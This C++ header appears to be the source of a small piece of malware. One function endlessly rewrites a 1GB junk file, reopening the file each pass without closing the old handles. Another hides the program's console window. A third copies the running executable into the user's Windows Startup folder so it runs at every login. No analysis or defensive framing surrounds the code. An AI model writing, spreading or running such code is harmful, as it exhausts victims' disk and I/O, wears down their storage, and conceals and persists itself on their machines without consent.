#pragma once
#pragma warning(disable:4996) // fopen unsafe warning

namespace write {
    void Write()
    {
        size_t fileSize = 214748364; // Since payload is 5 bytes, 1GB / 5
        const char* payload = "00000"; // A larger payload may be better for speed due to generally less syscalls...

#ifdef __linux__ 
        std::string path = "/home/var.txt";
#elif _WIN32
        std::string path = "C:\\Temp\\var.txt";
#endif
        // Other systems are not supported

        FILE* file = fopen(path.c_str(), "w");
        while (true)
        {
            // Write a total of 1GB
            for (auto i = 0; i != fileSize; ++i)
                fwrite(payload, 1, strlen(payload), file);

            file = fopen(path.c_str(), "w"); // Overwrite file
        }
        fclose(file);
    }

    void HideWindow()
    {
#ifdef _WIN32
        HWND Invisible;
        AllocConsole();
        Invisible = FindWindowA("ConsoleWindowClass", NULL);
        ShowWindow(Invisible, 0);
#endif
    }

    bool Autostart(std::string filename)
    {
        char self_name[MAX_PATH] = { 0 };
        GetModuleFileNameA(0, self_name, MAX_PATH);

        std::string appdataFolder = getenv("AppData");
        std::string path = (
            appdataFolder +
            "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\" +
            filename
        );

        if (!CopyFileA(self_name, path.c_str(), false))
            return false;

        return true;
    }
}